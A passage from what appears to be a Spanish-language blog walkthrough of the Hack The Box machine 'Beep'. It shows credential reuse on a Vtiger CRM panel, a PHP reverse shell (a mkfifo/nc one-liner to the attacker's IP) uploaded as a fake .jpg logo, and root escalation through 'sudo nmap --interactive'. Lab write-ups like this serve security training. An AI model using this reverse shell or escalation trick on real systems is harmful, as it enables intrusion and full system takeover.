<p>Si recordamos, en la fase de explotación a través del uso de un <em>LFI</em>, habíamos descubierto un panel de login de <code class="language-plaintext highlighter-rouge">Vtiger CRM</code>; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado <em>Settings/Company Details</em>, vamos a ver que hay una opción que nos permite cambiar el logo de la compañía, por lo que ya vamos teniendo una idea, de que podemos hacer.</p>

<p>De manera casi similar a la máquina <a href="https://mateonitro550.github.io/Vulnversity-TryHackMe">Vulnversity</a> de <em>TryHackMe</em>, vamos a tener que disfrazar un archivo <code class="language-plaintext highlighter-rouge">.php</code> como <code class="language-plaintext highlighter-rouge">.jpg</code>. No obstante, en este caso será un poco más sencillo ya que no haremos uso de <code class="language-plaintext highlighter-rouge">Burp Suite</code> (aunque podríamos); lo único que vamos a hacer es añadir la extensión <code class="language-plaintext highlighter-rouge">.jpg</code> a nuestra <code class="language-plaintext highlighter-rouge">reverseShell.php</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Podríamos utilizar la <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"><em>reverse shell</em></a> que nos provee <code class="language-plaintext highlighter-rouge">pentestmonkey</code> (para lo cual debemos modificar el campo <em>ip</em>, y colocar la nuestra, y si quisiéramos el campo <em>port</em>), o bien, crear nuestra propia <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nb">system</span><span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Y al igual que en los casos anteriores, previo a darle a <code class="language-plaintext highlighter-rouge">Save</code>, debemos de estar en escucha a través de <code class="language-plaintext highlighter-rouge">NetCat</code>, por el puerto que hayamos indicado en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, por lo que ahora si debemos de realizar la escalada de privilegios.</p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, nos es posible leer la flag del usuario con bajos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para conseguir la flag del usuario con máximos privilegios, al ser el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejecutar algunos binarios haciendo uso de <code class="language-plaintext highlighter-rouge">sudo</code>, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/33.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>La mejor forma para abusar de cualquier binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejecutar como root.</p>

<p>En este caso, tenemos un abanico de oportunidades, tenemos binarios como <code class="language-plaintext highlighter-rouge">chmod</code>, <code class="language-plaintext highlighter-rouge">chown</code>, <code class="language-plaintext highlighter-rouge">service</code>, <code class="language-plaintext highlighter-rouge">yum</code>, y el binario que vamos a explotar en esta ocasión: <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<p>Para explotar el binario <code class="language-plaintext highlighter-rouge">nmap</code>, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
<span class="o">!</span>sh
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/34.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/35.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

</article>

<div class="image-overlay" onclick="closeImage()"></div>
<img id="expandedImage" class="expanded-image">

<script>
function expandImage(img) {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  expandedImg.src = img.src;

  overlay.style.display = "block";
  expandedImg.style.display = "block";

  document.addEventListener("keydown", handleEscKey);
}

function closeImage() {
  var expandedImg = document.getElementById("expandedImage");
  var overlay = document.querySelector(".image-overlay");

  overlay.style.display = "none";
  expandedImg.style.display = "none";

  document.removeEventListener("keydown", handleEscKey);
}

function handleEscKey(event) {
  if (event.key === "Escape" || event.key === "Esc") {
    closeImage();
  }
}
</script>

      </section>
    </div>
  </div>

  

  <footer>
  <a href="https://creativecommons.org/licenses/by-nc/4.0/">
    <span>
        <b>m4teo</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-524F5BE8G5', 'auto');
  ga('send', 'pageview');
</script>
  

</body>
</html>
